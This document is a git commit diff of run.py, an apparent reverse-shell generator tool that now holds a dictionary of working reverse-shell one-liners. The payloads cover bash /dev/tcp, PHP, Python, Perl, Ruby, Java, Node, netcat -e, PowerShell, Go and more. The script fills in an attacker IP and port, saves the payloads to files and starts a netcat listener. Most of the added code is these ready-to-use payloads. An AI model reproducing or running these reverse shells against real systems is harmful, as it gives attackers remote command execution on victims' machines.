6a421c700472ca75653e6b02ed6c0d2a35cb8c6a
trhacknon <129875733+tucommenceapousser@users.noreply.github.com>
2024-08-19 17:32:14 +0200

    Update run.py

--- run.py
+++ run.py
@@ -1,137 +1,153 @@
 #!/usr/bin/env python3
 
-import os,sys,time,platform,argparse,netifaces
+import os
+import sys
+import time
+import platform
+import argparse
+import netifaces
+from colorama import init, Fore, Style
+from prompt_toolkit import prompt
+from prompt_toolkit.shortcuts import yes_no_dialog, ProgressBar
+from prompt_toolkit.styles import Style as PTStyle
 
-# color codes
-class color:
-    RED = "\033[1;31m"
-    GREEN = "\033[1;32m"
-    WHITE = "\033[1;37m"
-    BLUE = "\033[1;35m"
-    CYAN = "\033[1;36m"
+init()
 
-# greet mesg
-greet = f"\n{color.RED}       <<< {color.CYAN}Thanks for using {color.RED}>>>\n"
+style = {
+    'header': Fore.CYAN + Style.BRIGHT,
+    'success': Fore.GREEN + Style.BRIGHT,
+    'error': Fore.RED + Style.BRIGHT,
+    'input': Fore.YELLOW + Style.BRIGHT,
+    'info': Fore.BLUE + Style.BRIGHT,
+    'reset': Style.RESET_ALL
+}
 
-# checking for sys version 
-if sys.version_info.major != 3:
-    exit()
+def animated_greet():
+    message = f"{style['header']}Thanks for using this fun tool!{style['reset']}"
+    for char in message:
+        print(char, end='', flush=True)
+        time.sleep(0.05)
+    print("\n")
 
-# clear terminal 
 def clear():
-    if platform.system() == "Linux":
-        os.system("clear")
-    else:
-        # this script is now only avaiable for linux
-        exit()
+    os.system('cls' if platform.system() == 'Windows' else 'clear')
 
-# logo 
-def logo():
-    print(f"""
-{color.WHITE} _____ _          _ _ _   _       _ _
-{color.WHITE}/  ___| |        | | | | | |     | | |
-{color.WHITE}\ `--.| |__   ___| | | | | | __ _| | | ___ _   _
-{color.RED} `--. \ '_ \ / _ \ | | | | |/ _` | | |/ _ \ | | |
-{color.RED}/\__/ / | | |  __/ | \ \_/ / (_| | | |  __/ |_| |
-{color.GREEN}\____/|_| |_|\___|_|_|\___/ \__,_|_|_|\___|\__, |
-                                            __/ | {color.WHITE}1.0.0
-{color.RED} {color.CYAN}Nabil Rahman {color.WHITE}(github.com/Nabil-Official){color.GREEN}{color.RED}  |___/""")
+def animated_logo():
+    logo = f"""
+{style['header']}_____ _          _ _ _   _       _ _     
+/  ___| |        | | | | | |     | | |    
+\\ `--.| |__   ___| | | | | | __ _| | | ___ _   _
+ {style['error']} `--. \\ '_ \\ / _ \\ | | | | |/ _` | | |/ _ \\ | | |
+/\\__/ / | | |  __/ | \\ \\_/ / (_| | | |  __/ |_| |
+\\____/|_| |_|\\___|_|_|\\___/ \\__,_|_|_|\\___|\\__, |
+                                            __/ | 1.0.0
+{style['success']}TRHACKNON {style['header']}(github.com/tucommenceapousser){style['reset']} |___/"""
+    for line in logo.splitlines():
+        print(line)
+        time.sleep(0.1)
 
 def disp():
     clear()
-    logo()
+    animated_logo()
 
-# default shell
 default_shell = "bash"
 
-# avaiable_shells
-available_shells = ["bash","php","python","python3","perl",'java','javascript','node',"netcat",'awk','gawk','telnet','golang','powershell','tclsh',"ruby","xterm","ncat","socket"]
+reverse_shell_templates = {
+    "bash": "bash -i >& /dev/tcp/$IP/$PORT 0>&1",
+    "php": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1' \"); ?>",
+    "python": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);",
+    "perl": "use Socket;$i=\"$IP\";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN, '>&S');open(STDOUT, '>&S');open(STDERR, '>&S');exec('/bin/bash -i');",
+    "ruby": "require 'socket';require 'open3';f=TCPSocket.new('$IP', $PORT);while s = f.gets;Open3.popen3(s) do |stdin, stdout, stderr, wait_thr|;f.puts(stdout.read);end;end;",
+    "java": "import java.io.*;import java.net.*;public class ReverseShell {public static void main(String[] args) {try {String host = \"$IP\";int port = $PORT;Socket s = new Socket(host, port);InputStream in = s.getInputStream();OutputStream out = s.getOutputStream();Process p = new ProcessBuilder(\"/bin/bash\").redirectErrorStream(true).start();InputStream pipedIn = p.getInputStream();OutputStream pipedOut = p.getOutputStream();Thread t1 = new Thread(() -> {int c;while ((c = in.read()) != -1) pipedOut.write(c);});Thread t2 = new Thread(() -> {int c;while ((c = pipedIn.read()) != -1) out.write(c);});t1.start();t2.start();t1.join();t2.join();} catch (Exception e) {e.printStackTrace();}}}",
+    "node": "const net = require('net');const cp = require('child_process');const shell = cp.spawn('/bin/bash', []);const client = new net.Socket();client.connect($PORT, '$IP', () => {client.pipe(shell.stdin);shell.stdout.pipe(client);shell.stderr.pipe(client);});",
+    "netcat": "nc $IP $PORT -e /bin/bash",
+    "awk": "awk 'BEGIN {s=\"/bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1\";system(s)}'",
+    "gawk": "gawk 'BEGIN {s=\"/bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1\";system(s)}'",
+    "telnet": "telnet $IP $PORT | /bin/bash | telnet $IP $PORT",
+    "golang": "package main;import (\"net\";\"os\";\"os/exec\");func main() {l, _ := net.Dial(\"tcp\", \"$IP:$PORT\");cmd := exec.Command(\"/bin/bash\");cmd.Stdin = l;cmd.Stdout = l;cmd.Stderr = l;cmd.Run();}",
+    "powershell": "$client = New-Object System.Net.Sockets.TCPClient('$IP',$PORT);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer,0,$buffer.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()",
+    "tclsh": "package require Tclx;fconfigure stdin -buffering line;fconfigure stdout -buffering line;fconfigure stderr -buffering line;socket -server [list server $PORT] $IP;proc server {sock addr port} {fileevent $sock readable [list handler $sock]};proc handler {sock} {gets $sock line;exec /bin/bash -i -c \"$line\"}",
+    "ruby": "require 'socket';require 'open3';TCPSocket.open('$IP', $PORT) do |socket|;Open3.popen3('/bin/bash') do |stdin, stdout, stderr, wait_thr|;Thread.new {loop {socket.print stdout.read}};Thread.new {loop {socket.print stderr.read}};loop {socket.print stdin.read};end;end;",
+    "xterm": "xterm -e /bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1",
+    "ncat": "ncat $IP $PORT -e /bin/bash",
+    "socket": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
+}
 
-
-# parsing arguments
 disp()
-print("\n")
-parser = argparse.ArgumentParser(description=f"{color.GREEN}=================== Help Center ====================")
-parser.add_argument('-l','--list',dest='list',help="list of available shells (More shells will be added in the future)",action='store_true')
-parser.add_argument('-i','--ip',dest='lhost',type=str,help="specify IP address",required=False)
-parser.add_argument('-p','--port',dest='port',type=int,help="specify port",required=False)
-
-parser.add_argument('-s','--shell',dest='shell',type=str,help="specify shell type",required=False)
+parser = argparse.ArgumentParser(description=f"{style['info']}Help Center{style['reset']}")
+parser.add_argument('-l', '--list', dest='list', help="List of available shells", action='store_true')
+parser.add_argument('-i', '--ip', dest='lhost', type=str, help="Specify IP address", required=False)
+parser.add_argument('-p', '--port', dest='port', type=int, help="Specify port", required=False)
+parser.add_argument('-s', '--shell', dest='shell', type=str, help="Specify shell type", required=False)
+parser.add_argument('-d', '--download', dest='download', type=str, help="Specify directory to save reverse shell scripts", required=False)
 
 args = parser.parse_args()
 
-
-
 if args.list:
     disp()
-    print("\n")
-    print(f"{color.RED}[@] {color.GREEN}Available Shells are : {color.WHITE}",end="")
-    for x in available_shells:
-        print(x,end=" ")
-    print("")
-    exit()
-
-if not args.shell:
-    shellType = default_shell
-else:
-    shellType = args.shell 
+    print(f"{style['info']}Available Shells are : {style['reset']}" + ', '.join(reverse_shell_templates.keys()))
+    sys.exit()
 
 if not args.lhost:
     disp()
-    print("\n")
-    print(f"{color.WHITE}  -------[ {color.BLUE}SELECT IP {color.WHITE}]-------\n")
-    for vvv in netifaces.interfaces():
-        print(f"{color.RED}[+] {color.WHITE}",vvv, f" :{color.GREEN}",netifaces.ifaddresses(vvv)[netifaces.AF_INET][0]['addr'])
-    lhost = input(f"\n{color.WHITE}>> Enter IP address : {color.GREEN}")
-
-
+    print(f"{style['header']}------- SELECT IP -------{style['reset']}")
+    for interface in netifaces.interfaces():
+        try:
+            ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
+            print(f"{style['success']}[+] {style['reset']}{interface} : {style['info']}{ip}")
+        except (KeyError, IndexError):
+            continue
+    print(f"{style['input']}>> Enter IP address:{style['reset']} ", end="")
+    lhost = input().strip()
 else:
     lhost = args.lhost
 
-if not args.port:
-    port = 1234
-else:
-    port = args.port
+port = args.port if args.port else 1234
 
-if args.list:
-    print("")
-    for shells in available_shells:
-        print(f"{color.WHITE}[+] {color.GREEN}{shells.lower()}")
-
-
-def listener():
-    print(f"\n{color.RED}   [*] {color.WHITE}Starting listener at port {port}\n{color.GREEN}")
-    os.system(f"nc -lvnp {port}")
-
-# display shells:
-disp()
-if shellType not in available_shells:
-    print(f"\n{color.WHITE}[!] {color.RED}Sry, there is no shell available named ({shellType}). Use python3 revshell.py --help.")
-    exit()
-loc = f'shells/{shellType}'
-with open(loc,"r") as shell:
-    shells_list = shell.readlines()
-    total_shells = len(shells_list)
-    print(f"""
-  {color.RED}[#] {color.WHITE}ShellType : {color.GREEN}{shellType}
-  {color.RED}[#] {color.WHITE}LHOST     : {color.GREEN}{lhost}
-  {color.RED}[#] {color.WHITE}LPORT     : {color.GREEN}{port}
-  {color.RED}[#] {color.WHITE}Please Wait.....{color.GREEN}""")
-    time.sleep(0.5)
-    for shell in shells_list:
-        shell = shell.strip()
-        shell = shell.replace("$IP",lhost)
-        shell = shell.replace("$PORT",str(port))
-        if "." not in shell:
-            print(f"\n<<<< {color.WHITE}{shell} {color.GREEN}>>>>\n")
-        else:
-            print(f"{color.WHITE}---> {color.RED}{shell}{color.GREEN}")
-    user = input(f"\n{color.RED}>> {color.WHITE}Do you want to start listener? (y/n) {color.GREEN}: ")
-    if user == "y" or user == "yes":
-        listener()
-    elif user == "n" or user == "no":
-        print(greet)
-        exit()
+def generate_reverse_shell(shell_type, ip, port):
+    if shell_type in reverse_shell_templates:
+        return reverse_shell_templates[shell_type].replace("$IP", ip).replace("$PORT", str(port))
     else:
-        print(greet)
-        exit()
+        print(f"{style['error']}[!] No shell available named '{shell_type}'. Use --help for available options.{style['reset']}")
+        sys.exit()
+
+def save_shell_to_file(shell_code, shell_type, directory):
+    try:
+        if not os.path.exists(directory):
+            os.makedirs(directory)
+
+        file_path = os.path.join(directory, f"revshell_{shell_type}.txt")
+        with open(file_path, "w") as f:
+            f.write(shell_code)
+        print(f"{style['success']}[+] Reverse shell saved to {file_path}{style['reset']}")
+    except Exception as e:
+        print(f"{style['error']}[!] Error saving file: {str(e)}{style['reset']}")
+
+if args.download:
+    for shellType in reverse_shell_templates.keys():
+        shell_code = generate_reverse_shell(shellType, lhost, port)
+        save_shell_to_file(shell_code, shellType, args.download)
+
+custom_style = PTStyle.from_dict({
+    'dialog': 'bg:#005f5f fg:#ffffff',  
+    'dialog.body': 'bg:#000000 fg:#ffff00',  
+    'dialog.shadow': 'bg:#00af87',  
+    'dialog frame.label': 'bg:#5f005f fg:#ffffff',  
+    'dialog.button': 'bg:#ffaf00 fg:#000000',  
+    'dialog.button.focused': 'bg:#ff5f00 fg:#ffffff',  
+})
+
+user_response = yes_no_dialog(
+    title="Listener",
+    text="Do you want to start the listener?",
+    style=custom_style
+).run()
+
+if user_response:
+    def listener():
+        print(f"\n{style['error']}[*] Starting listener at port {port}{style['reset']}")
+        os.system(f"netcat -lvnp {port}")
+    listener()
+else:
+    animated_greet()
+    sys.exit()
